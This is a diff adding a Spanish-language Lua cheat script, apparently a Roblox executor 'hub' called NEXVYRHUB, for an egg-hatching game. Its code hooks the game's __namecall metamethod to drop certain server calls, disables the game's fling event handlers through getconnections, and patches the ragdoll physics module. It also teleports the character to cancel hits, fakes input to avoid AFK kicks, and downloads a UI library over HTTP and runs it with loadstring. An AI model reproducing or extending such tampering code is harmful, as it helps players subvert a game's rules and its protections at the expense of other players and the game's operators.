+        if S.Under then
+            ok = Sub.deliverUnder()
+        else
+            ok = deliver()
+        end
+        if ok and not carrying() then
+            ST.Entregas = ST.Entregas + n
+            S.Carried = false
+            S.RecTry = 0
+        end
+        return ok
+    end
+end
+
+local function inForbiddenZone()
+    local hrp = getHRP()
+    if not hrp then return false end
+    local z = zoneAt(hrp.Position)
+    return z ~= nil and z > allowedMaxZone()
+end
+
+local function escapeToBase()
+    local cf = baseCF()
+    if not cf then return end
+    notify("Zona sin poder suficiente: volviendo a la base", "shield")
+    S.Busy = true
+    S.Estado = "Saliendo de zona peligrosa..."
+    moveTo(cf, abortFarm)
+    S.Busy = false
+end
+
+local function farmCycle()
+    if isDead() or not getHRP() then
+        S.Estado = "Esperando personaje"
+        task.wait(0.5)
+        return
+    end
+
+    local c = getChar()
+    if LP:GetAttribute("Jailed") == true then
+        S.Estado = "Encarcelado, esperando"
+        task.wait(0.5)
+        return
+    end
+    if c and c:GetAttribute("Ragdolled") and not S.AntiGolpe then
+        task.wait(0.3)
+        return
+    end
+
+    if holding() then
+        S.Estado = "Golpeado: quedandome en el lugar..."
+        task.wait(0.1)
+        return
+    end
+
+    if inForbiddenZone() and not S.Carried then
+        escapeToBase()
+        return
+    end
+
+    if carrying() then
+        S.Busy = true
+        Sub.go()
+        S.Busy = false
+        return
+    end
+
+    if S.Carried then
+        S.Busy = true
+        S.Estado = "Recuperando el animal..."
+        local pickup
+        local t0 = os.clock()
+        while Alive and S.Farm and not isDead() and not holding() and os.clock() - t0 < 6 do
+            local h = getHRP()
+            pickup = h and findPickup(nil, h.Position, true)
+            if pickup then break end
+            task.wait(0.15)
+        end
+        if pickup then
+            if grab(pickup) then
+                S.RecTry = 0
+                Sub.go()
+            else
+                S.RecTry = S.RecTry + 1
+                if S.RecTry >= 4 then S.Carried = false; S.RecTry = 0 end
+            end
+        elseif not holding() then
+            S.Carried = false
+            S.RecTry = 0
+        end
+        S.Busy = false
+        return
+    end
+
+    if dodge() then return end
+
+    local egg = desiredEgg()
+    if not egg then
+        S.Estado = "No hay huevos en zonas seguras"
+        task.wait(0.6)
+        return
+    end
+    if not equipPickaxe() then
+        notify("No tienes el pico", "triangle-alert")
+        S.Estado = "No tienes el pico"
+        task.wait(1)
+        return
+    end
+
+    setHighlight(egg)
+    S.Estado = "Yendo al huevo..."
+    if not moveTo(standCF(egg), abortFarm) then return end
+
+    S.Estado = "Rompiendo huevo..."
+    local result = breakEgg(egg)
+    if result == "switch" or not S.Farm then return end
+
+    local t0 = os.clock()
+    while Alive and S.Farm and os.clock() - t0 < 3 do
+        if egg:GetAttribute("Hatching") or egg:GetAttribute("HatchId") ~= nil or not egg.Parent then break end
+        task.wait(0.05)
+    end
+    local hatchId = egg:GetAttribute("HatchId")
+    local epos = egg.Position
+    if egg:GetAttribute("NoPickup") then return end
+
+    S.Busy = true
+    S.Estado = "Esperando que salga el animal..."
+    local pickup
+    t0 = os.clock()
+    while Alive and S.Farm and not isDead() and os.clock() - t0 < CFG.EsperaPickup do
+        pickup = findPickup(hatchId, epos, os.clock() - t0 > 10)
+        if pickup then break end
+        dodge()
+        task.wait(0.1)
+    end
+
+    if not pickup then
+        S.Estado = "No aparecio el animal (se salta este huevo)"
+        S.Busy = false
+        return
+    end
+
+    if grab(pickup) then
+        S.Carried = true
+        S.RecTry = 0
+        Sub.go()
+    else
+        ST.Fallos = ST.Fallos + 1
+        S.Estado = "No pude agarrar el animal"
+        notify("No pude agarrar el animal", "triangle-alert")
+    end
+    S.Busy = false
+end
+
+task.spawn(function()
+    while Alive do
+        if S.Farm then
+            local ok, err = pcall(farmCycle)
+            if not ok then
+                S.Busy = false
+                S.Estado = "Error: " .. tostring(err)
+                warn("[NEXVYRHUB] " .. tostring(err))
+                task.wait(0.5)
+            end
+        else
+            task.wait(0.2)
+        end
+    end
+end)
+
+local lastSig = ""
+local function refreshSpy()
+    local list = scanEggs()
+    local values = { AUTO_LABEL }
+    local map = {}
+    local sig = {}
+    local selLabel
+
+    for i = 1, math.min(CFG.Top, #list) do
+        local lb = eggLabel(list[i], i)
+        values[#values + 1] = lb
+        map[lb] = list[i].part
+        sig[#sig + 1] = lb
+        if S.Selected == list[i].part then selLabel = lb end
+    end
+    if S.Selected and not selLabel and eggLive(S.Selected) then
+        local base = eggLabel(eggInfo(S.Selected, nil), 0)
+        local lb = "* " .. string.gsub(base, "^0%. ", "")
+        table.insert(values, 2, lb)
+        map[lb] = S.Selected
+        sig[#sig + 1] = lb
+        selLabel = lb
+    end
+    EggByLabel = map
+
+    local key = table.concat(sig, "|") .. "#" .. tostring(selLabel)
+    if key ~= lastSig and EggDropdown then
+        lastSig = key
+        pcall(function() EggDropdown:Refresh(values) end)
+        pcall(function() EggDropdown:Select(selLabel or AUTO_LABEL) end)
+    end
+
+    local target = S.Selected
+    if not target or not eggLive(target) then target = list[1] and list[1].part end
+    setHighlight(target)
+end
+
+task.spawn(function()
+    while Alive do
+        if S.Espiar then pcall(refreshSpy) end
+        task.wait(1.5)
+    end
+end)
+
+local Disabled = {}
+local flingHandler
+
+local function applyFlingBlock(on)
+    local fling = RS:FindFirstChild("CatchFlingRemote")
+    if not fling or not getconnections then return end
+    if on then
+        local ok, list = pcall(getconnections, fling.OnClientEvent)
+        if ok and type(list) == "table" then
+            for _, c in ipairs(list) do
+                local mine = false
+                pcall(function() mine = (c.Function == flingHandler) end)
+                if not mine and not Disabled[c] then
+                    local d = pcall(function() c:Disable() end)
+                    if d then Disabled[c] = true end
+                end
+            end
+        end
+    else
+        for c in pairs(Disabled) do
+            pcall(function() c:Enable() end)
+            Disabled[c] = nil
+        end
+    end
+end
+
+local RagdollMod, RagdollOrig
+local function patchRagdoll(on)
+    pcall(function()
+        if not RagdollMod then
+            RagdollMod = require(RS:WaitForChild("Shared"):WaitForChild("RagdollPhysics"))
+        end
+        if type(RagdollMod) ~= "table" then return end
+        if on then
+            if RagdollOrig == nil then RagdollOrig = RagdollMod.SetCharacterVelocity end
+            if setreadonly then pcall(setreadonly, RagdollMod, false) end
+            local orig = RagdollOrig
+            RagdollMod.SetCharacterVelocity = function(char, lin, ang)
+                if Alive and S.AntiGolpe and char == LP.Character then return end
+                return orig(char, lin, ang)
+            end
+        elseif RagdollOrig ~= nil then
+            RagdollMod.SetCharacterVelocity = RagdollOrig
+        end
+    end)
+end
+
+local BLOCKED_STATES = {
+    Enum.HumanoidStateType.Physics,
+    Enum.HumanoidStateType.Ragdoll,
+    Enum.HumanoidStateType.FallingDown,
+}
+
+local function lockStates(on)
+    local hum = getHum()
+    if not hum then return end
+    for _, st in ipairs(BLOCKED_STATES) do
+        pcall(function() hum:SetStateEnabled(st, not on) end)
+    end
+end
+
+local function recoverBody()
+    local c, hum, hrp = getChar(), getHum(), getHRP()
+    if hrp then
+        hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+        hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+    end
+    if hum and hum.Health > 0 then
+        pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true) end)
+        pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+    end
+    if c and c:GetAttribute("Ragdolled") then
+        pcall(function() c:SetAttribute("Ragdolled", nil) end)
+    end
+end
+
+local oldNamecall
+if hookmetamethod and newcclosure and getnamecallmethod then
+    pcall(function()
+        oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+            if Alive and S.AntiGolpe then
+                local m = getnamecallmethod()
+                if m == "FireServer" then
+                    if typeof(self) == "Instance" and self.Name == "PumpkinKingContact" then
+                        local a = ...
+                        if a == "Contact" or a == "Spotted" then return end
+                    end
+                elseif m == "ChangeState" then
+                    if typeof(self) == "Instance" and self == getHum() then
+                        local a = ...
+                        if a == Enum.HumanoidStateType.Physics then return end
+                    end
+                end
+            end
+            return oldNamecall(self, ...)
+        end))
+    end)
+end
+
+task.spawn(function()
+    local fling = RS:WaitForChild("CatchFlingRemote", 30)
+    if fling and Alive then
+        flingHandler = function(kind, _, dur)
+            if kind == "fling" then
+                S.FlingHasta = os.clock() + (tonumber(dur) or 5) + 1.5
+            end
+        end
+        track(fling.OnClientEvent:Connect(flingHandler))
+    end
+end)
+
+task.spawn(function()
+    while Alive do
+        if S.AntiGolpe then
+            applyFlingBlock(true)
+            lockStates(true)
+        end
+        task.wait(0.5)
+    end
+end)
+
+local HIST = {}
+
+track(RunService.Heartbeat:Connect(function()
+    if not S.AntiGolpe then return end
+    local now = os.clock()
+    local c = getChar()
+    local hrp = getHRP()
+    local hit = (c and c:GetAttribute("Ragdolled")) or now < S.FlingHasta
+
+    if not hit then
+        S.PrevHit = false
+        if hrp then
+            HIST[#HIST + 1] = { now, hrp.CFrame }
+            while #HIST > 0 and now - HIST[1][1] > 0.6 do table.remove(HIST, 1) end
+        end
+        return
+    end
+
+    if not S.PrevHit then
+        S.PrevHit = true
+        local pick
+        for _, h in ipairs(HIST) do
+            if now - h[1] >= 0.25 then pick = h[2] end
+        end
+        S.HitCF = pick or (HIST[1] and HIST[1][2]) or (hrp and hrp.CFrame)
+        S.HoldHasta = now + 1.2
+    end
+
+    if hrp and S.HitCF and now < S.HoldHasta then
+        hrp.CFrame = S.HitCF
+    end
+    recoverBody()
+end))
+
+track(LP.CharacterAdded:Connect(function()
+    task.wait(0.3)
+    if S.AntiGolpe then
+        applyFlingBlock(true)
+        patchRagdoll(true)
+        lockStates(true)
+    end
+end))
+
+local function afkPulse()
+    local hum = getHum()
+    local cam = Workspace.CurrentCamera
+    if VIM then
+        pcall(function()
+            VIM:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
+            task.wait(0.05)
+            VIM:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
+        end)
+    end
+    if hum and hum.Health > 0 then
+        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
+    end
+    if cam then
+        pcall(function()
+            local cf = cam.CFrame
+            cam.CFrame = cf * CFrame.Angles(0, math.rad(2), 0)
+            task.wait(0.02)
+            cam.CFrame = cf
+        end)
+    end
+    pcall(function()
+        VirtualUser:CaptureController()
+        VirtualUser:Button2Down(Vector2.new(0, 0), cam and cam.CFrame or CFrame.new())
+        task.wait(0.02)
+        VirtualUser:Button2Up(Vector2.new(0, 0), cam and cam.CFrame or CFrame.new())
+    end)
+end
+
+task.spawn(function()
+    local acc = 0
+    while Alive do
+        if S.AntiAfk or S.Farm then
+            acc = acc + 1
+            if acc >= CFG.AfkCada then
+                acc = 0
+                afkPulse()
+            end
+        else
+            acc = 0
+        end
+        task.wait(1)
+    end
+end)
+
+task.spawn(function()
+    local rej = RS:WaitForChild("EggHitRejected", 30)
+    if rej and Alive then
+        track(rej.OnClientEvent:Connect(function()
+            ST.Rechazos = ST.Rechazos + 1
+            S.Cooldown = math.min(1, S.Cooldown + 0.05)
+            S.OkHits = 0
+        end))
+    end
+    local ok = RS:WaitForChild("EggHitConfirmed", 30)
+    if ok and Alive then
+        track(ok.OnClientEvent:Connect(function()
+            ST.Golpes = ST.Golpes + 1
+            S.OkHits = S.OkHits + 1
+            if S.OkHits >= 20 and S.Cooldown > CFG.Cooldown then
+                S.Cooldown = math.max(CFG.Cooldown, S.Cooldown - 0.02)
+                S.OkHits = 0
+            end
+        end))
+    end
+end)
+
+do
+    local zonePos = {}
+    local step = 0
+    local fails = 0
+    local blockedUntil = 0
+
+    local function readZones()
+        local build = Workspace:FindFirstChild("Build")
+        local folder = build and build:FindFirstChild("ZoneHitboxes")
+        if not folder then return end
+        for i = 1, #ZONAS do
+            local p = folder:FindFirstChild(tostring(i))
+            if p and p:IsA("BasePart") then zonePos[i] = p.Position end
+        end
+    end
+
+    task.spawn(function()
+        while Alive do
+            if S.StreamZonas and (S.Farm or S.IrHuevo) and not isDead() and os.clock() >= blockedUntil then
+                local ok = pcall(function()
+                    readZones()
+                    local cap = allowedMaxZone()
+                    if cap < 1 then return end
+                    step = step + 1
+                    local z = cap
+                    if cap > 1 and step % 2 == 0 then
+                        z = (math.floor(step / 2) % (cap - 1)) + 1
+                    end
+                    local pos = zonePos[z]
+                    if pos then LP:RequestStreamAroundAsync(pos, 3) end
+                end)
+                if ok then
+                    fails = 0
+                else
+                    fails = fails + 1
+                    if fails >= 3 then
+                        fails = 0
+                        blockedUntil = os.clock() + 60
+                    end
+                end
+            end
+            task.wait(CFG.StreamCada)
+        end
+    end)
+end
+
+do
+    task.spawn(function()
+        while Alive do
+            if (S.Farm or S.IrHuevo) and not isDead() then
+                pcall(function()
+                    local hrp = getHRP()
+                    local limit = (Workspace.FallenPartsDestroyHeight or -500) + 60
+                    if hrp and hrp.Position.Y < limit then
+                        local cf = baseCF()
+                        if cf then
+                            hrp.CFrame = cf
+                            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                            notify("Te caiste del mapa: volviendo a tu base", "shield")
+                        end
+                    end
+                end)
+            end
+            task.wait(0.5)
+        end
+    end)
+end
+
+do
+    task.spawn(function()
+        while Alive do
+            if S.Farm then ST.Activo = ST.Activo + 1 end
+            task.wait(1)
+        end
+    end)
+end
+
+local FX = {
+    On        = false,
+    Token     = 0,
+    Restoring = false,
+    Orig      = setmetatable({}, { __mode = "k" }),
+    Conns     = {},
+    Light     = nil,
+    Terrain   = nil,
+    Quality   = nil,
+}
+
+local FX_KIND = {
+    ParticleEmitter     = "emitter",
+    Trail               = "enabled",
+    Beam                = "enabled",
+    Fire                = "enabled",
+    Smoke               = "enabled",
+    Sparkles            = "enabled",
+    PointLight          = "enabled",
+    SpotLight           = "enabled",
+    SurfaceLight        = "enabled",
+    Highlight           = "enabled",
+    Clouds              = "enabled",
+    BloomEffect         = "enabled",
+    BlurEffect          = "enabled",
+    ColorCorrectionEffect = "enabled",
+    DepthOfFieldEffect  = "enabled",
+    SunRaysEffect       = "enabled",
+    Atmosphere          = "atmos",
+    Explosion           = "explosion",
+    Texture             = "texture",
+}
+
+local FX_TAGS = { "VFX", "EnabledVFX", "ParticleEmitter" }
+
+local function fxApply(inst)
+    if inst.Name == "NEXVYRHUB_ESP" then return end
+    local kind = FX_KIND[inst.ClassName]
+    local o = FX.Orig[inst]
+
+    if kind == "emitter" then
+        if not o then
+            FX.Orig[inst] = { Enabled = inst.Enabled, Rate = inst.Rate, Lifetime = inst.Lifetime }
+        end
+        if inst.Enabled then inst.Enabled = false end
+        if inst.Rate ~= 0 then inst.Rate = 0 end
+        inst.Lifetime = NumberRange.new(0)
+    elseif kind == "enabled" then
+        if not o then FX.Orig[inst] = { Enabled = inst.Enabled } end
+        if inst.Enabled then inst.Enabled = false end
+    elseif kind == "atmos" then
+        if not o then FX.Orig[inst] = { Density = inst.Density, Haze = inst.Haze, Glare = inst.Glare } end
+        inst.Density = 0
+        inst.Haze = 0
+        inst.Glare = 0
+    elseif kind == "explosion" then
+        if not o then FX.Orig[inst] = { Visible = inst.Visible } end
+        inst.Visible = false
+    elseif kind == "texture" then
+        if not o then FX.Orig[inst] = { Transparency = inst.Transparency } end
+        if inst.Transparency < 1 then inst.Transparency = 1 end
+    elseif inst:IsA("BasePart") and not inst:IsA("Terrain") then
+        local changed = false
+        if not o then
+            o = { Material = inst.Material, CastShadow = inst.CastShadow, Reflectance = inst.Reflectance }
+            if inst:IsA("MeshPart") then o.RenderFidelity = inst.RenderFidelity end
+            changed = true
+        end
+        if changed then FX.Orig[inst] = o end
+        if inst.Material ~= Enum.Material.Neon and inst.Material ~= Enum.Material.Plastic then
+            inst.Material = Enum.Material.Plastic
+        end
+        if inst.CastShadow then inst.CastShadow = false end
+        if inst.Reflectance ~= 0 then inst.Reflectance = 0 end
+        if inst:IsA("MeshPart") and inst.RenderFidelity ~= Enum.RenderFidelity.Performance then
+            inst.RenderFidelity = Enum.RenderFidelity.Performance
+        end
+    end
+end
+
+local function fxHook(inst)
+    if not FX.On then return end
+    pcall(fxApply, inst)
+end
+
+local function fxSweep(token)
+    local t = os.clock()
+    for _, root in ipairs({ Lighting, Workspace }) do
+        local list = root:GetDescendants()
+        for i = 1, #list do
+            if FX.Token ~= token or not FX.On or not Alive then return end
+            pcall(fxApply, list[i])
+            if os.clock() - t > 0.004 then
+                task.wait()
+                t = os.clock()
+            end
+        end
+    end
+end
+
+local function fxEnvironment(on)
+    if on then
+        if not FX.Light then
+            FX.Light = {}
+            for _, p in ipairs({ "GlobalShadows", "ShadowSoftness", "EnvironmentSpecularScale" }) do
+                pcall(function() FX.Light[p] = Lighting[p] end)
+            end
+        end
+        pcall(function() Lighting.GlobalShadows = false end)
+        pcall(function() Lighting.ShadowSoftness = 0 end)
+        pcall(function() Lighting.EnvironmentSpecularScale = 0 end)
+
+        local terrain = Workspace:FindFirstChildOfClass("Terrain")
+        if terrain then
+            if not FX.Terrain then
+                FX.Terrain = {}
+                for _, p in ipairs({ "WaterWaveSize", "WaterWaveSpeed", "WaterReflectance" }) do
+                    pcall(function() FX.Terrain[p] = terrain[p] end)
+                end
+            end
+            pcall(function() terrain.WaterWaveSize = 0 end)
+            pcall(function() terrain.WaterWaveSpeed = 0 end)
+            pcall(function() terrain.WaterReflectance = 0 end)
+            if sethiddenproperty then
+                pcall(sethiddenproperty, terrain, "Decoration", false)
+            end
+        end
+
+        pcall(function()
+            local r = settings().Rendering
+            if FX.Quality == nil then FX.Quality = r.QualityLevel end
+            r.QualityLevel = Enum.QualityLevel.Level01
+        end)
+    else
+        if FX.Light then
+            for p, v in pairs(FX.Light) do
+                pcall(function() Lighting[p] = v end)
+            end
+            FX.Light = nil
+        end
+        local terrain = Workspace:FindFirstChildOfClass("Terrain")
+        if terrain and FX.Terrain then
+            for p, v in pairs(FX.Terrain) do
+                pcall(function() terrain[p] = v end)
+            end
+            if sethiddenproperty then
+                pcall(sethiddenproperty, terrain, "Decoration", true)
+            end
+        end
+        FX.Terrain = nil
+        if FX.Quality ~= nil then
+            pcall(function() settings().Rendering.QualityLevel = FX.Quality end)
+            FX.Quality = nil
+        end
+    end
+end
+
+local function fxRestoreAll()
+    FX.Restoring = true
+    local snapshot = {}
+    for inst, o in pairs(FX.Orig) do
+        snapshot[#snapshot + 1] = { inst, o }
+    end
+    FX.Orig = setmetatable({}, { __mode = "k" })
+
+    local t = os.clock()
+    for i = 1, #snapshot do
+        local inst, o = snapshot[i][1], snapshot[i][2]
+        if inst and inst.Parent then
+            pcall(function()
+                for prop, value in pairs(o) do
+                    inst[prop] = value
+                end
+            end)
+        end
+        if os.clock() - t > 0.004 then
+            task.wait()
+            t = os.clock()
+        end
+    end
+    FX.Restoring = false
+end
+
+local function fxSet(on)
+    on = on and true or false
+    if on == FX.On then return end
+    FX.On = on
+    FX.Token = FX.Token + 1
+    local token = FX.Token
+
+    if on then
+        task.spawn(function()
+            while FX.Restoring do task.wait(0.1) end
+            if FX.Token ~= token or not FX.On then return end
+            fxEnvironment(true)
+            FX.Conns[#FX.Conns + 1] = Workspace.DescendantAdded:Connect(fxHook)
+            FX.Conns[#FX.Conns + 1] = Lighting.DescendantAdded:Connect(fxHook)
+            fxSweep(token)
+        end)
+    else
+        for _, c in ipairs(FX.Conns) do pcall(function() c:Disconnect() end) end
+        FX.Conns = {}
+        fxEnvironment(false)
+        task.spawn(fxRestoreAll)
+    end
+end
+
+task.spawn(function()
+    while Alive do
+        if FX.On then
+            for _, tag in ipairs(FX_TAGS) do
+                for _, inst in ipairs(CollectionService:GetTagged(tag)) do
+                    pcall(fxApply, inst)
+                end
+            end
+        end
+        task.wait(2)
+    end
+end)
+
+local _version = "1.6.66"
+local uiFileName = "WindUI_Cache_v" .. _version .. ".txt"
+local timeFileName = "WindUI_Cache_v" .. _version .. "_Time.txt"
+
+local okUi, resUi = pcall(function()
+    local cacheValido = false
+
+    if isfile and isfile(timeFileName) and readfile then
+        local savedTime = tonumber(readfile(timeFileName))
+        if savedTime and (os.time() - savedTime) < 86400 then
+            cacheValido = true
+        end
+    end
+
+    if cacheValido and isfile and isfile(uiFileName) then
+        return loadstring(readfile(uiFileName))()
+    else
+        local codigoUi = game:HttpGet("https://github.com/Footagesus/WindUI/releases/download/" .. _version .. "/main.lua")
+
+        if writefile then
+            writefile(uiFileName, codigoUi)
+            writefile(timeFileName, tostring(os.time()))
+        end
+
+        return loadstring(codigoUi)()
+    end
+end)
+
+if okUi and resUi then
+    WindUI = resUi
+else
+    Alive = false
+    warn("[NEXVYRHUB] No se pudo cargar WindUI: " .. tostring(resUi))
+    return
+end
+
+pcall(function()
+    WindUI:AddTheme({
+        Name        = "Violeta",
+        Accent      = Color3.fromHex("#2e1065"),
+        Dialog      = Color3.fromHex("#1a0638"),
+        Outline     = Color3.fromHex("#6d28d9"),
+        Text        = Color3.fromHex("#ede9fe"),
+        Placeholder = Color3.fromHex("#7c3aed"),
+        Background  = Color3.fromHex("#0f0320"),
+        Button      = Color3.fromHex("#5b21b6"),
+        Icon        = Color3.fromHex("#a78bfa"),
+        Toggle      = Color3.fromHex("#6d28d9"),
+        Slider      = Color3.fromHex("#6d28d9"),
+        Checkbox    = Color3.fromHex("#6d28d9"),
+    })
+end)
+
+Window = WindUI:CreateWindow({
+    Title = CFG.Titulo,
+    Theme = "Violeta",
+    Author = "7.dui",
+    Folder = "NexvyrHub_WindUI",
+    Acrylic = false,
+    Transparent = false,
+    NewElements = true,
+    HideSearchBar = true,
+    OpenButton = {
+        Title = "Open HUB",
+        CornerRadius = UDim.new(1),
+        StrokeThickness = 1,
+        Enabled = true,
+        Draggable = true,
+        Scale = 0.8,
+        Color = ColorSequence.new(Color3.fromHex("#6d28d9"), Color3.fromHex("#3b0764"))
+    },
+    Topbar = {
+        Height = 44,
+        ButtonsType = "Default"
+    }
+})
+if not Window then
+    Alive = false
+    return
+end
+pcall(function() WindUI:SetTheme("Violeta") end)
+
+local TabFarm    = Window:Tab({ Title = "Auto farmeo", Icon = "solar:dollar-bold" })
+local TabConfig  = Window:Tab({ Title = "Configurar",  Icon = "solar:settings-bold" })
+
+TabFarm:Toggle({
+    Title = "Farm", Icon = "pickaxe", Value = false,
+    Callback = function(v)
+        if v then
+            S.Under = false
+            S.Farm = true
+            S.Estado = "Iniciando..."
+        else
+            S.Farm = false
+            S.Busy = false
+            S.Carried = false
+            S.RecTry = 0
+            S.Estado = "Apagado"
+        end
+    end,
+})
+
+TabFarm:Toggle({
+    Title = "Cargar zonas lejanas (huevos caros)", Icon = "map", Value = true,
+    Callback = function(v)
+        S.StreamZonas = v and true or false
+    end,
+})
+
+local zonaValues = { AUTO_ZONA }
+for i, z in ipairs(ZONAS) do
+    local lb = string.format("Zona %d | pide %s", i, fmt(z.Poder))
+    zonaValues[#zonaValues + 1] = lb
+    ZonaByLabel[lb] = i
+end
+
+TabFarm:Dropdown({
+    Title  = "Zona maxima",
+    Icon   = "map",
+    Values = zonaValues,
+    Value  = AUTO_ZONA,
+    Callback = function(opt)
+        if type(opt) == "table" then opt = opt.Title or opt[1] end
+        if opt == nil or opt == AUTO_ZONA then
+            S.ZonaMax = nil
+        else
+            S.ZonaMax = ZonaByLabel[opt]
+            local safe = safeMaxZone()
+            if S.ZonaMax and S.ZonaMax > safe then
+                notify("Tu velocidad solo aguanta hasta la zona " .. safe .. ", se usa esa", "triangle-alert")
+            end
+        end
+        S.Selected = nil
+        lastSig = ""
+    end,
+})
+
+TabFarm:Toggle({
+    Title = "Anti-afk", Icon = "timer", Value = false,
+    Callback = function(v)
+        S.AntiAfk = v and true or false
+    end,
+})
+
+TabConfig:Toggle({
+    Title = "FPS Boost", Icon = "zap", Value = false,
+    Callback = function(v)
+        fxSet(v and true or false)
+    end,
+})
+
+local function unload()
+    if not Alive then return end
+    Alive = false
+    S.Farm, S.AntiGolpe, S.IrHuevo, S.Espiar, S.AntiAfk = false, false, false, false, false
+    applyFlingBlock(false)
+    patchRagdoll(false)
+    lockStates(false)
+    if FX.On then
+        FX.On = false
+        FX.Token = FX.Token + 1
+        for _, c in ipairs(FX.Conns) do pcall(function() c:Disconnect() end) end
+        FX.Conns = {}
+        fxEnvironment(false)
+        task.spawn(fxRestoreAll)
+    end
+    for _, c in ipairs(Conns) do pcall(function() c:Disconnect() end) end
+    if HL then pcall(function() HL:Destroy() end) end
+    pcall(function() RunService:Set3dRenderingEnabled(true) end)
+    if Window then pcall(function() Window:Destroy() end) end
+    genv.NEXVYRHUB_UNLOAD = nil
+end
+genv.NEXVYRHUB_UNLOAD = unload
+pcall(function() Window:OnDestroy(unload) end)
+
+applyFlingBlock(true)
+patchRagdoll(true)
+lockStates(true)
